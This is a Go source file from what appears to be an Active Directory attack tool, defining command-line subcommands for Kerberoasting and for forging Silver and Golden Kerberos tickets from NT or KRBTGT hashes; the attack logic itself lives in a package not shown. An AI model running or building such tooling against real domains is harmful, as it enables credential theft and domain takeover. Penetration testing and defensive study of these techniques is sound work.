// cmd/adgo/commands/kerberos.go
package commands

import (
	"context"
	"fmt"

	"adgo/pkg/common"
	"adgo/pkg/exploits"

	"github.com/spf13/cobra"
)

var KerberoastCmd = &cobra.Command{
	Use:   "kerberoast",
	Short: "Perform Kerberoasting attack",
	RunE: func(cmd *cobra.Command, args []string) error {
		ctx := context.Background()

		creds, err := common.LoadCredentials()
		if err != nil {
			return fmt.Errorf("failed to load credentials (use --config or global flags -u/-p/-d): %w", err)
		}

		if creds.LDAPServer == "" || creds.BindDN == "" || creds.Password == "" {
			return fmt.Errorf("missing LDAP connection info. Use --config or global flags")
		}

		results, err := exploits.Kerberoast(ctx, *creds)
		if err != nil {
			return fmt.Errorf("failed to perform Kerberoast: %w", err)
		}

		common.PrintOutput(results, false, false, false)
		common.PrintSuccess("Kerberoasting performed successfully")
		return nil
	},
}

var SilverTicketCmd = &cobra.Command{
	Use:   "silverticket",
	Short: "Create a Silver Ticket",
	RunE: func(cmd *cobra.Command, args []string) error {
		result, err := exploits.SilverTicket(
			cmd.Flag("username").Value.String(),
			cmd.Flag("domain").Value.String(),
			cmd.Flag("target").Value.String(),
			cmd.Flag("nthash").Value.String(),
		)
		if err != nil {
			return fmt.Errorf("failed to create Silver Ticket: %w", err)
		}

		fmt.Println("[SUCCESS] " + result.Status)
		return nil
	},
}

var GoldenTicketCmd = &cobra.Command{
	Use:   "goldenticket",
	Short: "Create a Golden Ticket",
	RunE: func(cmd *cobra.Command, args []string) error {
		goldenTicket := exploits.NewGoldenTicket(
			cmd.Flag("domain").Value.String(),
			cmd.Flag("username").Value.String(),
			cmd.Flag("sid").Value.String(),
			cmd.Flag("krbtgthash").Value.String(),
			cmd.Flag("targetspn").Value.String(),
		)

		err := goldenTicket.Create()
		if err != nil {
			return fmt.Errorf("failed to create Golden Ticket: %w", err)
		}

		fmt.Println("[SUCCESS] Golden Ticket created successfully")
		return nil
	},
}

func init() {
	KerberosCmd.AddCommand(KerberoastCmd)
	KerberosCmd.AddCommand(GoldenTicketCmd)
	KerberosCmd.AddCommand(SilverTicketCmd)

	// === FLAGS ===
	SilverTicketCmd.Flags().StringP("username", "u", "", "Username")
	SilverTicketCmd.Flags().StringP("domain", "d", "", "Domain name")
	SilverTicketCmd.Flags().StringP("target", "t", "", "Target service (e.g. cifs/dc01.lab.local)")
	SilverTicketCmd.Flags().StringP("nthash", "n", "", "NT hash of the user")

	SilverTicketCmd.MarkFlagRequired("username")
	SilverTicketCmd.MarkFlagRequired("domain")
	SilverTicketCmd.MarkFlagRequired("target")
	SilverTicketCmd.MarkFlagRequired("nthash")

	GoldenTicketCmd.Flags().StringP("domain", "d", "", "Domain name")
	GoldenTicketCmd.Flags().StringP("username", "u", "", "Username")
	GoldenTicketCmd.Flags().StringP("sid", "s", "", "SID of the domain")
	GoldenTicketCmd.Flags().StringP("krbtgthash", "k", "", "KRBTGT hash")
	GoldenTicketCmd.Flags().StringP("targetspn", "", "", "Target SPN (optional)")

	GoldenTicketCmd.MarkFlagRequired("domain")
	GoldenTicketCmd.MarkFlagRequired("username")
	GoldenTicketCmd.MarkFlagRequired("sid")
	GoldenTicketCmd.MarkFlagRequired("krbtgthash")
}

// KerberosCmd est la commande racine
var KerberosCmd = &cobra.Command{
	Use:   "kerberos",
	Short: "Kerberos operations",
}
